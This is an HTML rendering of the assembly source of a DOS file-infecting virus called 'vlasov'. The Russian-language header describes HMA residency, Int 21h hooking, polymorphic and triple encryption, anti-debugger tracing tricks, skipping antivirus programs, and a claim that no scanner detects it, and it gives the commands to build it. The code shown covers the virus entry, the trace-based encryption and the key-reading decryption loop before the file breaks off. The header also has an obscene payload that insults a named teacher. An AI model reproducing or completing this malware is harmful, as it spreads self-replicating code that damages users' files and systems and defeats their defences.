<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>vlasov.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; 1 - включиить отладочный режим</span><span class="sc0">
        </span><span class="sc1">; 0 - выключить отладочный режим</span><span class="sc0">

</span><span class="sc1">; COMMENT %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;   EXE.HMA-TSR.POLYMORPH. There is no much free space into HMA,</span><span class="sc0">
</span><span class="sc1">;   therefore virus has a swap file at the disk (C:\WINA20.386).</span><span class="sc0">
</span><span class="sc1">;   To hook Int 21h virus patches original DOS handler placed</span><span class="sc0">
</span><span class="sc1">;   into HMA too. HMA is same for all V86 machines, therefore once</span><span class="sc0">
</span><span class="sc1">;   installed virus is present at the all tasks.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    Прошел ровно год со дня выпуска моего последнего продукта... Однако не</span><span class="sc0">
</span><span class="sc1">; думайте, что всесь год я страдал хуйней (хотя это, к сожалению, тоже имело</span><span class="sc0">
</span><span class="sc1">; место): на подходе еще несколько интересных вещей (осталось доделать буквально</span><span class="sc0">
</span><span class="sc1">; пару мелочей). Сейчас перед вами очередной DOS-вирус, НО это первый много-</span><span class="sc0">
</span><span class="sc1">; задачный(!) DOS-вирус для WINDOWS. Такого вы еще, я думаю, не видели. Теперь</span><span class="sc0">
</span><span class="sc1">; подробнее.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    1. Используется оригинальный метод посадки в память. Как известно, в HMA</span><span class="sc0">
</span><span class="sc1">;       есть немного места - это во-первых. Во-вторых, в HMA чаще всего загружен</span><span class="sc0">
</span><span class="sc1">;       DOS. В третьих, когда вы закрываете DOS-окно в WINDOWS, HMA не</span><span class="sc0">
</span><span class="sc1">;       восстанавливается до первоначального вида (чего нельзя сказать об</span><span class="sc0">
</span><span class="sc1">;       остальной доступной DOS-памяти). И, наконец, самое главное: HMA - общая</span><span class="sc0">
</span><span class="sc1">;       для всех задач. Для непосвященных: HMA - это High Memory Area (FFFF:0010-</span><span class="sc0">
</span><span class="sc1">;       FFFF:FFFF). Эта область доступна на процессоре 386 и выше, причем должна</span><span class="sc0">
</span><span class="sc1">;       быть открыта адресная линия A20. Все выше сказанное мы используем</span><span class="sc0">
</span><span class="sc1">;       следующим образом:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       a) Выделяем место в HMA и копируем туда специальную подпрограмму Loader</span><span class="sc0">
</span><span class="sc1">;          (об этом ниже).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       b) Ищем в HMA обработчик DOS (для тех, кто не знает: туда обязательно</span><span class="sc0">
</span><span class="sc1">;          передается управление при каждом вызове Int 21h). Он начинается так:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              FA          cli</span><span class="sc0">
</span><span class="sc1">;              80 FC 73    cmp ah,73h</span><span class="sc0">
</span><span class="sc1">;              77 xx       ja  xx</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       c) Заменяем "cmp ah,73h" на "call Loader". Теперь мы висим на Int 21h.</span><span class="sc0">
</span><span class="sc1">;          Call - ближний, так как мы находимся в одном сегменте с DOS - FFFF.</span><span class="sc0">
</span><span class="sc1">;          Перед возвратом из Loader нужно выполнить "cmp ah,73h" (на всякий</span><span class="sc0">
</span><span class="sc1">;          случай).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       d) Теперь о Loader. Так как в HMA места довольно мало, то прийдется</span><span class="sc0">
</span><span class="sc1">;          в подпрограмму Loader поместить только подгрузчик основной части</span><span class="sc0">
</span><span class="sc1">;          вируса, которую нужно записать, например, в своп-файл. Эта программа</span><span class="sc0">
</span><span class="sc1">;          выделяет место в обычной памяти, копирует туда вирус из файла и</span><span class="sc0">
</span><span class="sc1">;          передает ему управление. Далее, как в обычном вирусе.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       Итак, теперь вирус перехватил Int 21h и, так как HMA общая для всех</span><span class="sc0">
</span><span class="sc1">;       задач, то и вирус существует во всех задачах.</span><span class="sc0">
</span><span class="sc1">;       Замечание: на практике все несколько сложнее, так что лучше посмотрите</span><span class="sc0">
</span><span class="sc1">;       исходник. Некоторые детали из вышеописанного для данного вируса:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       a) Своп-файл шифруется. Кроме того к нему дописывается мусор. Имя</span><span class="sc0">
</span><span class="sc1">;          своп-файла: "C:\WINA20.386" - стандартный, но никому не нужный файл</span><span class="sc0">
</span><span class="sc1">;          от Windows 3.11</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       b) При каждом вызове f.4Bh Int 21h HMA-часть вируса проверяет наличие</span><span class="sc0">
</span><span class="sc1">;          основного тела в обычной памяти и, по мере надобности, размещает</span><span class="sc0">
</span><span class="sc1">;          его там.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       c) Основное тело вируса в памяти также находится в шифрованом виде,</span><span class="sc0">
</span><span class="sc1">;          и в начале стоит IRET. Перед вызовом основного тела вирус его</span><span class="sc0">
</span><span class="sc1">;          расшифровывает, а после отработки зашифровывает его вновь и ставит</span><span class="sc0">
</span><span class="sc1">;          в начало IRET.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       d) Адрес основного тела вируса хранится в Int 65h (хотя можно в любом</span><span class="sc0">
</span><span class="sc1">;          другом неиспользуемом инте). Адрес нельзя хранить в теле вируса,</span><span class="sc0">
</span><span class="sc1">;          чтоб система не проглючила при переключении задач под WINDOWS.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       e) После передачи управления подпрограмме, которая находится в HMA,</span><span class="sc0">
</span><span class="sc1">;          устанавливается защита от рекурсии посредством изменения одной из</span><span class="sc0">
</span><span class="sc1">;          первых команд на JMP Exit, где Exit указывает на конец нашей</span><span class="sc0">
</span><span class="sc1">;          подпрограммы.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    2. Вирус трижды шифрован.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       a) Первая процедура шифровки - полиморфна и имеет переменную длину.</span><span class="sc0">
</span><span class="sc1">;          Используются: изменение регистров и мусорные команды. Генератор</span><span class="sc0">
</span><span class="sc1">;          мусорных команд создает:</span><span class="sc0">
</span><span class="sc1">;           * 1-байтные команды (а также префиксы сегментов) выбором из списка;</span><span class="sc0">
</span><span class="sc1">;           * 2-,3-,4-байтные команды вида COMMAND R/M,REG путем получения</span><span class="sc0">
</span><span class="sc1">;             случайного числа из порта таймера с последующим анализом его</span><span class="sc0">
</span><span class="sc1">;             битов и добавлением (если нужно) числовых операндов.</span><span class="sc0">
</span><span class="sc1">;          Это мой первый полиморфик, так что не судите строго.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       b) Вторая процедура шифровки использует антиэвристический алгоритм,</span><span class="sc0">
</span><span class="sc1">;          который, по моим данным, еще нигде не использовался: вирус открывает</span><span class="sc0">
</span><span class="sc1">;          файл-носитель и считывает последние два байта (это ключ расшифровки).</span><span class="sc0">
</span><span class="sc1">;          Затем вирус стандартно расшифровывает остальную часть кода, после</span><span class="sc0">
</span><span class="sc1">;          чего проверяет, удачно ли прошла расшифровка. В случае ошибки выводит</span><span class="sc0">
</span><span class="sc1">;          на экран сообщение и завершает выполение программы.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       c) Вторая процедура шифровки сама частично зашифрована. Тут применяется</span><span class="sc0">
</span><span class="sc1">;          довольно оригинальный алгоритм, который я раньше нигде не встречал, а</span><span class="sc0">
</span><span class="sc1">;          именно - динамическая шифровка/расшифровка. Она реализована следующим</span><span class="sc0">
</span><span class="sc1">;          образом: сначала устанавливается обработчик Int 1, который шифрует</span><span class="sc0">
</span><span class="sc1">;          одним ключем команду, которая выполнилась до его вызова, а затем</span><span class="sc0">
</span><span class="sc1">;          расшифровывает другим ключем команду, которая должна выполниться</span><span class="sc0">
</span><span class="sc1">;          после. После установки обработчика включается трассировка, и</span><span class="sc0">
</span><span class="sc1">;          выполняется некоторый участок кода. Затем трассировка выключается.</span><span class="sc0">
</span><span class="sc1">;          В результате этот участок кода становится зашифрованным уже другим</span><span class="sc0">
</span><span class="sc1">;          ключем. Этот алгоритм содержит большое количество нюансов и, видимо</span><span class="sc0">
</span><span class="sc1">;          поэтому, нигде(?) не реализован. Вот некоторые моменты:</span><span class="sc0">
</span><span class="sc1">;           * После некоторых команд все прерывания (в том числе и Int 1)</span><span class="sc0">
</span><span class="sc1">;             запрещаются, поэтому команды, стоящие следом за ними, остаются</span><span class="sc0">
</span><span class="sc1">;             нешифрованными.</span><span class="sc0">
</span><span class="sc1">;           * Шифруется только один байт каждой команды, т.к. определить длину</span><span class="sc0">
</span><span class="sc1">;             команды достаточно сложно.</span><span class="sc0">
</span><span class="sc1">;           * Данный алгоритм нельзя применять, если шифруемый код содержит</span><span class="sc0">
</span><span class="sc1">;             участки, выполняющиеся неоднократно (подпрограммы, циклы). Это</span><span class="sc0">
</span><span class="sc1">;             можно исправить, но тогда код должен шифроваться одним и тем же</span><span class="sc0">
</span><span class="sc1">;             ключем.</span><span class="sc0">
</span><span class="sc1">;           * Нужно проверять сегмент шифруемой команды, чтоб случайно не</span><span class="sc0">
</span><span class="sc1">;             зашифровать обработчик того прерывания, которое может возникнуть</span><span class="sc0">
</span><span class="sc1">;             в процессе выполнения кода.</span><span class="sc0">
</span><span class="sc1">;           * Нужно учитывать, что первый раз Int 1 вызывается только после</span><span class="sc0">
</span><span class="sc1">;             команды, следующей за командой включения трассировки, и уже не</span><span class="sc0">
</span><span class="sc1">;             вызывается после команды выключения трассировки.</span><span class="sc0">
</span><span class="sc1">;          Данный алгоритм показал свою эффективность в плане обламывания всех</span><span class="sc0">
</span><span class="sc1">;          имеющихся у меня отладчиков (вроде бы даже WinIce 4.0).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    3. Заражение файлов.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;       a) Вирус стандартно заражает MZ-EXE файлы при запуске, дописываясь</span><span class="sc0">
</span><span class="sc1">;          в конец.</span><span class="sc0">
</span><span class="sc1">;       b) Проверка типа файла происходит как по расширению, так и по первым</span><span class="sc0">
</span><span class="sc1">;          двум байтам файла.</span><span class="sc0">
</span><span class="sc1">;       c) После заражения файл становится оверлейным (в конце находится ключ</span><span class="sc0">
</span><span class="sc1">;          для расшифровки). Так как вирус не трогает оверлейные файлы, то</span><span class="sc0">
</span><span class="sc1">;          повторного заражения произойти не может.</span><span class="sc0">
</span><span class="sc1">;       d) Не заражает некоторые антивирусы (DR*,AD*,AV*,TB*).</span><span class="sc0">
</span><span class="sc1">;       e) Не портит NewEXE (NE,PE,LE,LX) - для них сделана специальная проверка.</span><span class="sc0">
</span><span class="sc1">;       f) Обрабатывает атрибут "Только чтение". Не изменяет атрибуты и время</span><span class="sc0">
</span><span class="sc1">;          создания файла.</span><span class="sc0">
</span><span class="sc1">;       g) Есть заглушка на Int 24h. Не глючит на защищенных от записи дискетах.</span><span class="sc0">
</span><span class="sc1">;       h) Базовая длина вируса (без полиморфного расшифровщика) - 2400 байта.</span><span class="sc0">
</span><span class="sc1">;          После заражения размер файла увеличивается в среднем на 2500 байт.</span><span class="sc0">
</span><span class="sc1">;       i) Есть режим отладки, при котором вирус заражает только файлы, имена</span><span class="sc0">
</span><span class="sc1">;          которых начинаются на "ZZ". Для включения этого режима надо установить</span><span class="sc0">
</span><span class="sc1">;          DEBUG=1 (по умолчанию - 0).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;    4. Вирус содержит прикольную демку, которая активизируется при заражении</span><span class="sc0">
</span><span class="sc1">;       каждого 256-го файла. Краткое описание демки: внизу экрана из стороны</span><span class="sc0">
</span><span class="sc1">;       в сторону ездит тележка. На тележке стоит хуй, который брызгает спермой.</span><span class="sc0">
</span><span class="sc1">;       Из спермы выкладывается надпись: "ВЛАСОВ - ПИДОР".</span><span class="sc0">
</span><span class="sc1">;       Лирическое отступление: Власов - препод по информатике. Это человек,</span><span class="sc0">
</span><span class="sc1">;       который нихуя не знает, но при этом обладает просто фантастическим</span><span class="sc0">
</span><span class="sc1">;       самомнением.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ИТОГ: Многозадачный полиморфный MZ-EXE вирус, полностью совместимый с WINDOWS</span><span class="sc0">
</span><span class="sc1">;       и созданный специально для WINDOWS. Не детектируется (пока) никакими</span><span class="sc0">
</span><span class="sc1">;       антивирусами. Содержит прикольную графическую демку. Многочисленные</span><span class="sc0">
</span><span class="sc1">;       испытания доказали его работоспособность и отсутствие глюков на момент</span><span class="sc0">
</span><span class="sc1">;       выпуска в свет.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                                   DJ Sadovnikov (http://i.am/djsad), 18.11.1999</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  ══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              Компилировать с помощью TASM 4.1+</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 tasm /m vlasov.asm</span><span class="sc0">
</span><span class="sc1">;                 tlink /x vlasov.obj</span><span class="sc0">
</span><span class="sc1">;                 del vlasov.obj</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;              Файлы из архива:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                 vlasov.asm  34000 (исходник вируса)</span><span class="sc0">
</span><span class="sc1">;                 vlasov.exe   2945 (бинарник вируса)</span><span class="sc0">
</span><span class="sc1">;                 vlasov.com    777 (демка отдельно)</span><span class="sc0">
</span><span class="sc1">;                 vlasov.doc   4500 (техническая информация)</span><span class="sc0">
</span><span class="sc1">; %</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">



</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.286</span><span class="sc0">
</span><span class="sc5">Code</span><span class="sc0">        </span><span class="sc9">segment</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">Code</span><span class="sc0">

</span><span class="sc5">Start</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4C00h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Msg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'Virus has started...$'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               НАЧАЛО ВИРУСА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Virus</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">


</span><span class="sc1">;[Вычисляем точку входа в вирус]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetIP</span><span class="sc0">
</span><span class="sc5">GetIP</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetIP</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем обработчик трассировки]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2501h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Int01h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем начальные значения для расшифровки]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BegCr</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PrevOfs</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PrevSeg</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PrevXor</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">NextXor</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">BegCr</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">EndCr</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">PrevXor</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">


</span><span class="sc1">;[DS = Environment segment]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2Ch</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">


</span><span class="sc1">;[Ищем имя файла-носителя]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Loop00</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0000</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Found1</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Loop00</span><span class="sc0">


</span><span class="sc1">;[Включаем трассировку]</span><span class="sc0">

</span><span class="sc5">Found1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000001b</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">BegCr</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;[Открываем файл-носитель]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D00h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">


</span><span class="sc1">;[Устанавливаем указатель на два байта от конца файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4202h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFEh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Считываем последние два байта файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">Key1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Закрываем файл-носитель]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Eh</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">


</span><span class="sc1">;[Выключаем трассировку]</span><span class="sc0">

        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111110b</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc5">EndCr</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">;[Расшифровываем вирус]</span><span class="sc0">

</span><span class="sc5">Key1</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Crypt</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
</span><span class="sc5">Loop01</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop01</span><span class="sc0">


</span><span class="sc1">;[Проверяем правильность расшифровки]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Crypt</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">01B8h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Crypt</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
